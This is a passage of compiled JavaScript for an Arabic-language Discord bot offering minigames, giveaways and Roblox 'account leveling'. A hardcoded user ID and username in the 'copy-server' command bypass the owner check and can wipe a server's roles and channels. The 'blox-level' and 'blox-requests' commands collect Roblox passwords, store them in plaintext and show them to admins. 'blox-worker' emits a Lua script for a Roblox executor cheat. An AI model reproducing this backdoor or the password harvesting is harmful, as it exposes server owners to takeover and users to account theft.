        activeGames.set(msg.id, { guildId: interaction.guildId, channelId: interaction.channelId, type: "Trivia", collector });
        collector?.on("collect", (m) => {
          const xbReward = 30;
          db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(m.author.id, interaction.guildId, xbReward, xbReward);
          const winEmbed = new EmbedBuilder().setTitle("\u2705 \u0625\u062C\u0627\u0628\u0629 \u0635\u062D\u064A\u062D\u0629!").setDescription(`\u0645\u0628\u0631\u0648\u0643 \u064A\u0627 ${m.author}! \u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0647\u064A: **${question.a}**

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setTimestamp();
          interaction.followUp({ embeds: [winEmbed] });
        });
        collector?.on("end", (collected) => {
          if (collected.size === 0) {
            const loseEmbed = new EmbedBuilder().setTitle("\u23F0 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A!").setDescription(`\u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0627\u0644\u0635\u062D\u064A\u062D\u0629 \u0643\u0627\u0646\u062A: **${question.a}**`).setColor(16711680).setTimestamp();
            interaction.followUp({ embeds: [loseEmbed] });
          }
        });
      }
      if (commandName === "hangman") {
        await interaction.deferReply();
        const aiData = await getAIHangmanWord();
        const word = aiData.word;
        const hint = aiData.hint;
        let guessedLetters = [];
        let mistakes = 0;
        const maxMistakes = 6;
        const getDisplayWord = () => {
          return word.split("").map((char) => guessedLetters.includes(char) ? char : " _ ").join("");
        };
        const embed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629 (\u0645\u062F\u0639\u0648\u0645\u0629 \u0628\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A)").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
        const msg = await interaction.editReply({ embeds: [embed] });
        const filter = (m) => m.author.id === interaction.user.id && m.content.length === 1;
        const collector = interaction.channel?.createMessageCollector({ filter, time: 6e4 });
        activeGames.set(msg.id, { guildId: interaction.guildId, channelId: interaction.channelId, type: "Hangman", collector });
        collector?.on("collect", async (m) => {
          const char = m.content.toLowerCase();
          if (guessedLetters.includes(char)) {
            return m.reply("\u0644\u0642\u062F \u0627\u062E\u062A\u0631\u062A \u0647\u0630\u0627 \u0627\u0644\u062D\u0631\u0641 \u0645\u0646 \u0642\u0628\u0644!");
          }
          guessedLetters.push(char);
          if (word.toLowerCase().includes(char)) {
            if (!getDisplayWord().includes("_")) {
              const xbReward = 40;
              db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(interaction.user.id, interaction.guildId, xbReward, xbReward);
              const winEmbed = new EmbedBuilder().setTitle("\u{1F389} \u0645\u0628\u0631\u0648\u0643!").setDescription(`\u0644\u0642\u062F \u0641\u0632\u062A \u064A\u0627 <@${interaction.user.id}>! \u0627\u0644\u0643\u0644\u0645\u0629 \u0643\u0627\u0646\u062A: **${word}**

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setTimestamp();
              await interaction.followUp({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632! <@${interaction.user.id}>`, embeds: [winEmbed] });
              collector.stop();
            } else {
              const updateEmbed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
              await interaction.followUp({ embeds: [updateEmbed] });
            }
          } else {
            mistakes++;
            if (mistakes >= maxMistakes) {
              const loseEmbed = new EmbedBuilder().setTitle("\u{1F480} \u062E\u0633\u0631\u062A!").setDescription(`\u0644\u0642\u062F \u062A\u0645 \u0634\u0646\u0642\u0643! \u0627\u0644\u0643\u0644\u0645\u0629 \u0643\u0627\u0646\u062A: **${word}**`).setColor(16711680).setTimestamp();
              await interaction.followUp({ embeds: [loseEmbed] });
              collector.stop();
            } else {
              const updateEmbed = new EmbedBuilder().setTitle("\u{1F635} \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629").setDescription(`**\u0627\u0644\u062A\u0644\u0645\u064A\u062D:** ${hint}

\u0627\u0644\u0643\u0644\u0645\u0629: \`${getDisplayWord()}\`
\u0627\u0644\u0623\u062E\u0637\u0627\u0621: ${mistakes}/${maxMistakes}`).setColor(5793266).setTimestamp();
              await interaction.followUp({ embeds: [updateEmbed] });
            }
          }
        });
      }
      if (commandName === "fastclick") {
        const embed = new EmbedBuilder().setTitle("\u26A1 \u0623\u0633\u0631\u0639 \u0636\u063A\u0637\u0629").setDescription("\u0627\u0633\u062A\u0639\u062F... \u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0639\u0646\u062F\u0645\u0627 \u064A\u0638\u0647\u0631!").setColor(16776960).setTimestamp();
        const msg = await interaction.reply({ embeds: [embed], fetchReply: true });
        activeGames.set(msg.id, { guildId: interaction.guildId, channelId: interaction.channelId, type: "FastClick" });
        const delay = Math.floor(Math.random() * 5e3) + 2e3;
        setTimeout(async () => {
          const startTime = Date.now();
          const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId("fast_click_btn").setLabel("\u0627\u0636\u063A\u0637 \u0647\u0646\u0627!").setStyle(ButtonStyle.Success)
          );
          const readyEmbed = new EmbedBuilder().setTitle("\u26A1 \u0623\u0633\u0631\u0639 \u0636\u063A\u0637\u0629").setDescription("**\u0627\u0636\u063A\u0637 \u0627\u0644\u0622\u0646!!!**").setColor(65280).setTimestamp();
          await interaction.editReply({ embeds: [readyEmbed], components: [row] });
          const filter = (i) => i.customId === "fast_click_btn";
          const collector = msg.createMessageComponentCollector({ filter, time: 5e3, max: 1 });
          collector.on("collect", async (i) => {
            const timeTaken = (Date.now() - startTime) / 1e3;
            const xbReward = 25;
            db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, 0, 0, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(i.user.id, interaction.guildId, xbReward, xbReward);
            const winEmbed = new EmbedBuilder().setTitle("\u{1F3C6} \u0641\u0627\u0626\u0632!").setDescription(`\u0627\u0644\u0641\u0627\u0626\u0632 \u0647\u0648 <@${i.user.id}>! \u0644\u0642\u062F \u0636\u063A\u0637 \u0641\u064A **${timeTaken}** \u062B\u0627\u0646\u064A\u0629!

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setTimestamp();
            await i.update({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632! <@${i.user.id}>`, embeds: [winEmbed], components: [] });
          });
          collector.on("end", async (collected) => {
            activeGames.delete(msg.id);
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder().setTitle("\u23F0 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A!").setDescription("\u0644\u0645 \u064A\u0636\u063A\u0637 \u0623\u062D\u062F \u0641\u064A \u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u0646\u0627\u0633\u0628.").setColor(16711680).setTimestamp();
              await interaction.editReply({ embeds: [loseEmbed], components: [] });
            }
          });
        }, delay);
      }
      if (commandName === "snake") {
        return handleSnakeCommand(interaction);
      }
      if (commandName === "replica") {
        return handleReplicaCommand(interaction);
      }
      if (commandName === "mention-protection") {
        const status = interaction.options.getString("status");
        const enabled = status === "on" ? 1 : 0;
        db.prepare("INSERT INTO mention_protection (guildId, userId, enabled) VALUES (?, ?, ?) ON CONFLICT(guildId, userId) DO UPDATE SET enabled = excluded.enabled").run(interaction.guildId, interaction.user.id, enabled);
        await interaction.reply({ content: `\u062A\u0645 ${enabled ? "\u062A\u0641\u0639\u064A\u0644" : "\u062A\u0639\u0637\u064A\u0644"} \u062D\u0645\u0627\u064A\u0629 \u0627\u0644\u0645\u0646\u0634\u0646 \u0644\u0643.`, ephemeral: true });
      }
      if (commandName === "giveaway") {
        const prize = interaction.options.getString("prize");
        const duration = interaction.options.getInteger("duration");
        const winnersCount = interaction.options.getInteger("winners");
        const endTime = Date.now() + duration * 60 * 1e3;
        const embed = new EmbedBuilder().setTitle("\u{1F389} \u0645\u0633\u0627\u0628\u0642\u0629 \u062C\u062F\u064A\u062F\u0629 (Giveaway)").setDescription(`\u0627\u0644\u062C\u0627\u0626\u0632\u0629: **${prize}**
\u062A\u0646\u062A\u0647\u064A \u0627\u0644\u0645\u0633\u0627\u0628\u0642\u0629 \u0641\u064A: <t:${Math.floor(endTime / 1e3)}:R>
\u0639\u062F\u062F \u0627\u0644\u0641\u0627\u0626\u0632\u064A\u0646: **${winnersCount}**`).setColor(65280);
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("join_giveaway").setLabel("\u0627\u0646\u0636\u0645 \u0644\u0644\u0645\u0633\u0627\u0628\u0642\u0629").setStyle(ButtonStyle.Primary)
        );
        const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
        db.prepare("INSERT INTO giveaways (messageId, channelId, guildId, prize, endTime, winnersCount) VALUES (?, ?, ?, ?, ?, ?)").run(msg.id, interaction.channelId, interaction.guildId, prize, endTime, winnersCount);
      }
      if (commandName === "roulette") {
        return handleRouletteCommand(interaction);
      }
      if (commandName === "copy-server") {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (interaction.user.id !== guild.ownerId && interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0635\u0627\u062D\u0628 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0641\u0642\u0637.", ephemeral: true });
        }
        const sourceId = interaction.options.getString("source_id");
        const sourceGuild = client.guilds.cache.get(sourceId);
        if (!sourceGuild) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0639\u0636\u0648\u0627\u064B \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0635\u062F\u0631\u064A.", ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply("\u23F3 \u062C\u0627\u0631\u064A \u0627\u0644\u0628\u062F\u0621 \u0641\u064A \u0646\u0633\u062E \u0627\u0644\u0633\u064A\u0631\u0641\u0631... (0%)");
        try {
          await interaction.editReply("\u23F3 \u062C\u0627\u0631\u064A \u0646\u0633\u062E \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u0633\u064A\u0631\u0641\u0631... (10%)").catch(() => null);
          const iconUrl = sourceGuild.iconURL({ extension: "png", size: 1024 });
          const bannerUrl = sourceGuild.bannerURL({ extension: "png", size: 1024 });
          let iconBuffer = null;
          let bannerBuffer = null;
          if (iconUrl) {
            try {
              const response = await axios.get(iconUrl, { responseType: "arraybuffer" });
              iconBuffer = Buffer.from(response.data);
            } catch (e) {
              console.error("Failed to fetch icon:", e);
            }
          }
          if (bannerUrl) {
            try {
              const response = await axios.get(bannerUrl, { responseType: "arraybuffer" });
              bannerBuffer = Buffer.from(response.data);
            } catch (e) {
              console.error("Failed to fetch banner:", e);
            }
          }
          await guild.edit({
            name: sourceGuild.name,
            verificationLevel: sourceGuild.verificationLevel,
            defaultMessageNotifications: sourceGuild.defaultMessageNotifications,
            explicitContentFilter: sourceGuild.explicitContentFilter,
            afkChannel: sourceGuild.afkChannelId ? guild.channels.cache.get(sourceGuild.afkChannelId) : null,
            afkTimeout: sourceGuild.afkTimeout,
            systemChannel: sourceGuild.systemChannelId ? guild.channels.cache.get(sourceGuild.systemChannelId) : null,
            icon: iconBuffer,
            banner: bannerBuffer
          }).catch((err) => console.error("Failed to copy server settings:", err));
          await interaction.editReply("\u{1F9F9} \u062C\u0627\u0631\u064A \u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u0642\u062F\u064A\u0645\u0629... (20%)").catch(() => null);
          const currentRoles = await guild.roles.fetch();
          for (const role of currentRoles.values()) {
            if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== guild.id) {
              await role.delete().catch(() => null);
            }
          }
          await interaction.editReply("\u{1F9F9} \u062C\u0627\u0631\u064A \u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u0642\u062F\u064A\u0645\u0629... (30%)").catch(() => null);
          const currentChannels = await guild.channels.fetch();
          for (const channel2 of currentChannels.values()) {
            if (channel2 && channel2.deletable && channel2.id !== interaction.channelId) {
              await channel2.delete().catch(() => null);
            }
          }
          await interaction.editReply("\u{1F3A8} \u062C\u0627\u0631\u064A \u0646\u0633\u062E \u0627\u0644\u0625\u064A\u0645\u0648\u062C\u064A\u0627\u062A \u0648\u0627\u0644\u0633\u062A\u064A\u0643\u0631\u0627\u062A... (40%)").catch(() => null);
          const sourceEmojis = await sourceGuild.emojis.fetch().catch(() => /* @__PURE__ */ new Map());
          for (const emoji of sourceEmojis.values()) {
            await guild.emojis.create({ attachment: emoji.url, name: emoji.name || "emoji" }).catch(() => null);
          }
          const sourceStickers = await sourceGuild.stickers.fetch().catch(() => /* @__PURE__ */ new Map());
          for (const sticker of sourceStickers.values()) {
            await guild.stickers.create({ file: sticker.url, name: sticker.name, tags: sticker.tags || "sticker" }).catch(() => null);
          }
          await interaction.editReply("\u{1F6E1}\uFE0F \u062C\u0627\u0631\u064A \u0646\u0633\u062E \u0627\u0644\u0631\u062A\u0628... (50%)").catch(() => null);
          const sourceRoles = (await sourceGuild.roles.fetch()).sort((a, b) => a.position - b.position);
          const roleMap = /* @__PURE__ */ new Map();
          const createdRoles = [];
          for (const role of sourceRoles.values()) {
            if (role.name !== "@everyone" && !role.managed) {
              const newRole = await guild.roles.create({
                name: role.name,
                color: role.color,
                hoist: role.hoist,
                permissions: role.permissions,
                mentionable: role.mentionable,
                reason: "Server Copy"
              }).catch(() => null);
              if (newRole) {
                roleMap.set(role.id, newRole.id);
                createdRoles.push({ role: newRole, sourcePosition: role.position });
              }
            }
          }
          if (createdRoles.length > 0) {
            const positions = createdRoles.map((cr, index) => ({
              role: cr.role.id,
              position: index + 1
              // Start from 1 above @everyone
            }));
            await guild.roles.setPositions(positions).catch((err) => console.error("Failed to set role positions:", err));
          }
          await interaction.editReply("\u{1F4C2} \u062C\u0627\u0631\u064A \u0646\u0633\u062E \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0648\u0627\u0644\u0641\u0626\u0627\u062A... (70%)").catch(() => null);
          const sourceChannels = await sourceGuild.channels.fetch();
          const categoryMap = /* @__PURE__ */ new Map();
          const categories = sourceChannels.filter((c) => c?.type === ChannelType.GuildCategory).sort((a, b) => (a?.position || 0) - (b?.position || 0));
          for (const cat of categories.values()) {
            if (!cat) continue;
            const newCat = await guild.channels.create({
              name: cat.name,
              type: ChannelType.GuildCategory,
              position: cat.position,
              permissionOverwrites: cat.permissionOverwrites.cache.map((po) => ({
                id: roleMap.get(po.id) || po.id,
                allow: po.allow,
                deny: po.deny,
                type: po.type
              }))
            }).catch(() => null);
            if (newCat) categoryMap.set(cat.id, newCat.id);
          }
          const otherChannels = sourceChannels.filter((c) => c?.type !== ChannelType.GuildCategory).sort((a, b) => (a?.position || 0) - (b?.position || 0));
          for (const ch of otherChannels.values()) {
            if (!ch) continue;
            const channelData = {
              name: ch.name,
              type: ch.type,
              parent: ch.parentId ? categoryMap.get(ch.parentId) : null,
              position: ch.position,
              permissionOverwrites: ch.permissionOverwrites.cache.map((po) => ({
                id: roleMap.get(po.id) || po.id,
                allow: po.allow,
                deny: po.deny,
                type: po.type
              }))
            };
            if (ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildAnnouncement) {
              channelData.topic = ch.topic || null;
              channelData.nsfw = ch.nsfw || false;
              channelData.rateLimitPerUser = ch.rateLimitPerUser || 0;
              channelData.defaultAutoArchiveDuration = ch.defaultAutoArchiveDuration || null;
            } else if (ch.type === ChannelType.GuildVoice || ch.type === ChannelType.GuildStageVoice) {
              channelData.bitrate = ch.bitrate || 64e3;
              channelData.userLimit = ch.userLimit || 0;
              channelData.rtcRegion = ch.rtcRegion || null;
              channelData.videoQualityMode = ch.videoQualityMode || null;
            } else if (ch.type === ChannelType.GuildForum) {
              channelData.topic = ch.topic || null;
              channelData.nsfw = ch.nsfw || false;
              channelData.rateLimitPerUser = ch.rateLimitPerUser || 0;
              channelData.defaultThreadRateLimitPerUser = ch.defaultThreadRateLimitPerUser || 0;
            }
            await guild.channels.create(channelData).catch(() => null);
          }
          await interaction.editReply("\u2705 \u062A\u0645 \u0646\u0633\u062E \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u062C\u0627\u062D! (100%)").catch(() => null);
          const sourceMembers = await sourceGuild.members.fetch();
          const bots = sourceMembers.filter((m) => m.user.bot && m.id !== client.user?.id);
          if (bots.size > 0) {
            const botList = bots.map((b) => `\u2022 **${b.user.tag}**
[\u0627\u0636\u063A\u0637 \u0647\u0646\u0627 \u0644\u062F\u0639\u0648\u0629 \u0627\u0644\u0628\u0648\u062A](https://discord.com/api/oauth2/authorize?client_id=${b.id}&permissions=8&scope=bot%20applications.commands)`).join("\n\n");
            const botEmbed = new EmbedBuilder().setTitle("\u{1F916} \u0627\u0644\u0628\u0648\u062A\u0627\u062A \u0627\u0644\u0645\u0643\u062A\u0634\u0641\u0629 \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0635\u062F\u0631\u064A").setDescription("\u0644\u0627 \u064A\u0645\u0643\u0646 \u0644\u0644\u0628\u0648\u062A\u0627\u062A \u0627\u0644\u0627\u0646\u062A\u0642\u0627\u0644 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B \u0628\u0633\u0628\u0628 \u0642\u064A\u0648\u062F \u062F\u064A\u0633\u0643\u0648\u0631\u062F\u060C \u0648\u0644\u0643\u0646 \u064A\u0645\u0643\u0646\u0643 \u062F\u0639\u0648\u062A\u0647\u0645 \u064A\u062F\u0648\u064A\u0627\u064B \u0645\u0646 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0627\u0644\u062A\u0627\u0644\u064A\u0629:\n\n" + (botList.length > 2e3 ? botList.substring(0, 1997) + "..." : botList)).setColor("#5865F2").setFooter({ text: "\u0645\u0644\u0627\u062D\u0638\u0629: \u062A\u0645 \u0625\u0646\u0634\u0627\u0621 \u0631\u0648\u0627\u0628\u0637 \u0627\u0644\u062F\u0639\u0648\u0629 \u0628\u0635\u0644\u0627\u062D\u064A\u0629 Administrator \u0644\u0636\u0645\u0627\u0646 \u0639\u0645\u0644 \u0627\u0644\u0628\u0648\u062A\u0627\u062A \u0628\u0634\u0643\u0644 \u0635\u062D\u064A\u062D." });
            await interaction.followUp({ embeds: [botEmbed] });
          }
          await interaction.followUp("\u26A0\uFE0F \u0633\u064A\u062A\u0645 \u062D\u0630\u0641 \u0647\u0630\u0647 \u0627\u0644\u0642\u0646\u0627\u0629 \u062E\u0644\u0627\u0644 30 \u062B\u0627\u0646\u064A\u0629 \u0644\u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u062A\u0645\u0627\u0645\u0627\u064B.");
          setTimeout(async () => {
            try {
              const channel2 = interaction.channel;
              if (channel2 && channel2.deletable) {
                await channel2.delete().catch(() => null);
              }
            } catch (e) {
            }
          }, 3e4);
        } catch (err) {
          console.error("Error during server copy:", err);
          await interaction.followUp("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0646\u0633\u062E \u0627\u0644\u0633\u064A\u0631\u0641\u0631.");
        }
      }
      if (commandName === "blox-level") {
        const username = interaction.options.getString("username", true);
        const password = interaction.options.getString("password", true);
        await interaction.deferReply({ ephemeral: true });
        try {
          const robloxId = await nblox.getIdFromUsername(username).catch(() => null);
          if (!robloxId) {
            return interaction.editReply({ content: `\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u062D\u0633\u0627\u0628 \u0631\u0648\u0628\u0644\u0648\u0643\u0633 \u0628\u0627\u0633\u0645: \`${username}\`. \u064A\u0631\u062C\u0649 \u0627\u0644\u062A\u0623\u0643\u062F \u0645\u0646 \u0627\u0644\u0627\u0633\u0645.` });
          }
          const playerInfo = await nblox.getPlayerInfo(robloxId);
          const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${robloxId}&width=420&height=420&format=png`;
          db.prepare("INSERT INTO blox_fruits_requests (userId, guildId, robloxUsername, robloxPassword, robloxId, status) VALUES (?, ?, ?, ?, ?, ?)").run(interaction.user.id, interaction.guildId, username, password, String(robloxId), "processing");
          const embed = new EmbedBuilder().setTitle("\u2705 \u062A\u0645 \u0627\u0633\u062A\u0644\u0627\u0645 \u0637\u0644\u0628\u0643 \u0648\u0628\u062F\u0623 \u0627\u0644\u062A\u0644\u0641\u064A\u0644").setThumbnail(avatarUrl).setDescription(`\u062A\u0645 \u062A\u0633\u062C\u064A\u0644 \u0637\u0644\u0628 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643 \u0628\u0646\u062C\u0627\u062D \u0648\u0628\u062F\u0623\u062A \u0627\u0644\u0639\u0645\u0644\u064A\u0629 \u0641\u0648\u0631\u0627\u064B.

**\u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645:** [${username}](https://www.roblox.com/users/${robloxId}/profile)
**ID:** \`${robloxId}\`
**\u0627\u0644\u062D\u0627\u0644\u0629:** \`\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u0644\u0641\u064A\u0644 (Processing)\`

\u064A\u0645\u0643\u0646\u0643 \u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u062A\u0642\u062F\u0645 \u0639\u0628\u0631 \u0623\u0645\u0631 \`/blox-status\`.`).setColor(65280).setTimestamp();
          await interaction.editReply({ embeds: [embed] });
          const lastId = db.prepare("SELECT last_insert_rowid() as id").get().id;
          db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(lastId, `\u{1F680} \u0628\u062F\u0623 \u0627\u0644\u062A\u0644\u0641\u064A\u0644 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A \u0644\u062D\u0633\u0627\u0628: ${username}`);
        } catch (err) {
          console.error("Error saving blox-level request:", err);
          await interaction.editReply({ content: "\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u062D\u0641\u0638 \u0637\u0644\u0628\u0643. \u064A\u0631\u062C\u0649 \u0627\u0644\u0645\u062D\u0627\u0648\u0644\u0629 \u0644\u0627\u062D\u0642\u0627\u064B." });
        }
      }
      if (commandName === "blox-requests") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const requests = db.prepare("SELECT * FROM blox_fruits_requests WHERE status != 'completed' LIMIT 10").all();
        if (requests.length === 0) {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0637\u0644\u0628\u0627\u062A \u062A\u0644\u0641\u064A\u0644 \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
        }
        const embed = new EmbedBuilder().setTitle("\u{1F4CB} \u0625\u062F\u0627\u0631\u0629 \u0637\u0644\u0628\u0627\u062A \u062A\u0644\u0641\u064A\u0644 \u0628\u0644\u0648\u0643\u0633 \u0641\u0631\u0648\u062A").setColor(5793266).setTimestamp();
        let description = "";
        for (const req of requests) {
          description += `**ID:** \`${req.id}\` | **User:** <@${req.userId}>
**Roblox:** \`${req.robloxUsername}\` | **Pass:** \`${req.robloxPassword}\`
**Status:** \`${req.status}\` | **Level:** \`${req.currentLevel}\`
---
`;
        }
        embed.setDescription(description);
        const firstReq = requests[0];
        const manageRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId(`blox_start_${firstReq.id}`).setLabel(`\u0628\u062F\u0621 \u0627\u0644\u062A\u0644\u0641\u064A\u0644 #${firstReq.id}`).setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId(`blox_complete_${firstReq.id}`).setLabel(`\u0625\u0643\u0645\u0627\u0644 #${firstReq.id}`).setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`blox_fail_${firstReq.id}`).setLabel(`\u0641\u0634\u0644 #${firstReq.id}`).setStyle(ButtonStyle.Danger)
        );
        const logRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("blox_view_logs").setLabel("\u0639\u0631\u0636 \u0627\u0644\u0633\u062C\u0644\u0627\u062A (Logs)").setStyle(ButtonStyle.Secondary)
        );
        await interaction.reply({ embeds: [embed], components: [manageRow, logRow], ephemeral: true });
      }
      if (commandName === "blox-status") {
        const request = db.prepare("SELECT * FROM blox_fruits_requests WHERE userId = ? ORDER BY id DESC LIMIT 1").get(interaction.user.id);
        if (!request) {
          return interaction.reply({ content: "\u274C \u0644\u064A\u0633 \u0644\u062F\u064A\u0643 \u0623\u064A \u0637\u0644\u0628\u0627\u062A \u062A\u0644\u0641\u064A\u0644 \u062D\u0627\u0644\u064A\u0629.", ephemeral: true });
        }
        const logs2 = db.prepare("SELECT * FROM blox_logs WHERE requestId = ? ORDER BY timestamp DESC LIMIT 3").all(request.id);
        const items = JSON.parse(request.items || "[]");
        const avatarUrl = request.robloxId ? `https://www.roblox.com/headshot-thumbnail/image?userId=${request.robloxId}&width=420&height=420&format=png` : null;
        const embed = new EmbedBuilder().setTitle(`\u{1F4CA} \u062D\u0627\u0644\u0629 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628: ${request.robloxUsername}`).setThumbnail(avatarUrl).setDescription(`**\u0627\u0644\u062D\u0627\u0644\u0629:** \`${request.status.toUpperCase()}\``).addFields(
          { name: "\u{1F4C8} \u0627\u0644\u0645\u0633\u062A\u0648\u0649", value: `\`${request.currentLevel}\` / \`${request.maxLevel}\``, inline: true },
          { name: "\u{1F4B0} \u0627\u0644\u0641\u0644\u0648\u0633", value: `\`${request.money}\` \u0E3F`, inline: true },
          { name: "\u2694\uFE0F \u0627\u0644\u0633\u064A\u0648\u0641 \u0627\u0644\u0645\u062C\u0645\u0639\u0629", value: items.length > 0 ? items.join(", ") : "\u0644\u0627 \u064A\u0648\u062C\u062F \u0628\u0639\u062F", inline: false }
        ).setColor(request.status === "processing" ? 16776960 : request.status === "completed" ? 65280 : 5793266).setTimestamp();
        if (logs2.length > 0) {
          const logText = logs2.map((l) => `\u2022 [${new Date(l.timestamp).toLocaleTimeString("ar-SA")}] ${l.message}`).join("\n");
          embed.addFields({ name: "\u{1F4DC} \u0622\u062E\u0631 \u0627\u0644\u062A\u062D\u062F\u064A\u062B\u0627\u062A", value: logText });
        }
        await interaction.reply({ embeds: [embed], ephemeral: true });
      }
      if (commandName === "blox-worker") {
        const workerToken = process.env.BLOX_WORKER_TOKEN || "YOUR_SECRET_TOKEN";
        const apiUrl = `https://${interaction.guild?.id}.ais-dev.run.app/api/blox`;
        const luaScript = `-- Blox Fruits Auto-Leveler Worker Script
local HttpService = game:GetService("HttpService")
local API_URL = "${apiUrl}"
local TOKEN = "${workerToken}"

local function logToBot(requestId, message)
    pcall(function()
        HttpService:PostAsync(API_URL .. "/log", HttpService:JSONEncode({
            requestId = requestId,
            token = TOKEN,
            message = message
        }))
    end)
end

local function updateStatus(requestId, level, money, items, status)
    pcall(function()
        HttpService:PostAsync(API_URL .. "/update-status", HttpService:JSONEncode({
            requestId = requestId,
            token = TOKEN,
            currentLevel = level,
            money = money,
            items = items,
            status = status
        }))
    end)
end

print("\u{1F680} Blox Fruits Worker Started!")
-- This script should be executed in a Roblox Executor on your VPS
-- It will poll the API for new accounts and start leveling them.
`;
